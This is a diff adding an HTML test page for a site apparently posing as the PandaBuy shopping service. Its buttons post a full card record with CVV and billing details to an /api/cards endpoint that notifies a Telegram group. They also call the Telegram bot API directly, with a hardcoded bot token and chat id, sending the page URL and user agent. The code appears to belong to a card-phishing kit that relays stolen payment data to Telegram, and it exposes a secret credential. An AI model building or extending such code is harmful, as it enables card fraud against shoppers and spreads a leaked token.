@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>API Test - PandaBuy</title>
+    <style>
+        body { font-family: Arial, sans-serif; padding: 20px; }
+        .test-result { margin: 10px 0; padding: 10px; border-radius: 5px; }
+        .success { background: #d4edda; color: #155724; }
+        .error { background: #f8d7da; color: #721c24; }
+        .info { background: #d1ecf1; color: #0c5460; }
+        button { padding: 10px 20px; margin: 5px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h1>PandaBuy API Test</h1>
+    <p>This page tests if your API endpoint is working on the live site.</p>
+    
+    <button onclick="testAPI()">Test /api/cards Endpoint</button>
+    <button onclick="testTelegram()">Test Telegram Bot</button>
+    
+    <div id="results"></div>
+
+    <script>
+        function addResult(message, type = 'info') {
+            const results = document.getElementById('results');
+            const div = document.createElement('div');
+            div.className = `test-result ${type}`;
+            div.innerHTML = `<strong>${new Date().toLocaleTimeString()}</strong>: ${message}`;
+            results.appendChild(div);
+        }
+
+        async function testAPI() {
+            addResult('Testing /api/cards endpoint...', 'info');
+            
+            const testData = {
+                cardNumber: "4532111122223333",
+                cardName: "API TEST",
+                expMonth: "12",
+                expYear: "28",
+                cvv: "123",
+                email: "apitest@pandabuycn.com",
+                phoneNumber: "+1234567890",
+                billingAddress: "123 API Test St",
+                city: "Test City",
+                state: "TS",
+                zipCode: "12345",
+                country: "Test Country"
+            };
+
+            try {
+                const response = await fetch('/api/cards', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(testData)
+                });
+
+                if (response.ok) {
+                    const result = await response.json();
+                    addResult(`✅ API Success: ${JSON.stringify(result)}`, 'success');
+                    addResult('🚀 Check your Telegram for the notification!', 'success');
+                } else {
+                    addResult(`❌ API Error: ${response.status} - ${response.statusText}`, 'error');
+                    const errorText = await response.text();
+                    addResult(`Error details: ${errorText}`, 'error');
+                }
+            } catch (error) {
+                addResult(`❌ Network Error: ${error.message}`, 'error');
+                addResult('This usually means the server is not running or the endpoint doesn\'t exist.', 'error');
+            }
+        }
+
+        async function testTelegram() {
+            addResult('Testing Telegram bot directly...', 'info');
+            
+            try {
+                // Test if we can reach Telegram API
+                const botToken = '7931279431:AAEmt1eZuMT0V3xo_-lsrCRFlnDQB-W9rMo';
+                const chatId = '-1002738425512';
+                
+                const message = `🧪 DIRECT TEST from ${window.location.hostname}
+                
+Time: ${new Date().toLocaleString()}
+URL: ${window.location.href}
+User Agent: ${navigator.userAgent}
+
+This is a direct test of the Telegram bot!`;
+
+                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                
+                const response = await fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+
+                if (response.ok) {
+                    addResult('✅ Telegram Direct Test Success! Check your group.', 'success');
+                } else {
+                    const error = await response.json();
+                    addResult(`❌ Telegram Error: ${JSON.stringify(error)}`, 'error');
+                }
+            } catch (error) {
+                addResult(`❌ Telegram Network Error: ${error.message}`, 'error');
+            }
+        }
+
+        // Auto-run tests when page loads
+        window.onload = function() {
+            addResult(`Page loaded on: ${window.location.href}`, 'info');
+            addResult('Click the buttons above to test your API and Telegram bot.', 'info');
+        };
+    </script>
+</body>
+</html> 
